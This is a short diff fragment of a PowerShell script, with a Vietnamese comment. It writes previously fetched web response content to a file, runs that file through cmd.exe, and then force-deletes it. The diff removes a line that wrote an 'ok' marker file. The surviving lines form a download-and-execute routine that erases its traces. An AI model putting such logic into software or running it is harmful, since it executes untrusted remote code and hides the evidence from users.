@@ -24,4 +24,3 @@ Set-Content -Path $FilePath -Value $response.Content
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait
 # Xóa file tạm sau khi thực thi
 Remove-Item -Path $FilePath -Force
-Set-Content -Path "C:\index1.txt" -Value "ok"
